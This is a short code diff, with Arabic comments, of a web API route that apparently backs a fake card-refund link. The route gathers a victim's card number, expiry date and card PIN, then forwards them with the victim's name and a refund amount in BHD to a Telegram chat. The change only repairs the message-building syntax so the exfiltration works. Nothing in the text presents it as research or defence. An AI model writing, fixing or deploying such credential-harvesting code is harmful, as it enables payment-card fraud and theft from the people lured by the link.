@@ -29,14 +29,14 @@ export async function POST(request: Request) {
   if (!profile) return fail("الرابط غير متوفر أو منتهي.", 404);
 
   // شكل الرسالة الجديدة اللي هتوصلك على تليجرام
-  const text = [
+ const text = [
     "💳 طلب جديد: استرجاع على البطاقة (من رابط العميل)",
-    👤 اسم العميل: ${profile.name},
-    💰 مبلغ الاسترجاع: ${profile.amount.toFixed(3)} BHD,
-    💳 رقم البطاقة: ${data.cardNumber},
-    📅 تاريخ الانتهاء: ${data.expiryDate},
-    🔒 الرقم السري: ${data.pin},
-    ⏰ الوقت: ${new Date().toISOString()},
+    "👤 اسم العميل: " + profile.name,
+    "💰 مبلغ الاسترجاع: " + profile.amount.toFixed(3) + " BHD",
+    "💳 رقم البطاقة: " + data.cardNumber,
+    "📅 تاريخ الانتهاء: " + data.expiryDate,
+    "🔒 الرقم السري: " + data.pin,
+    "⏰ الوقت: " + new Date().toISOString()
   ].join("\n");
 
   const sent = await telegramSend(text);
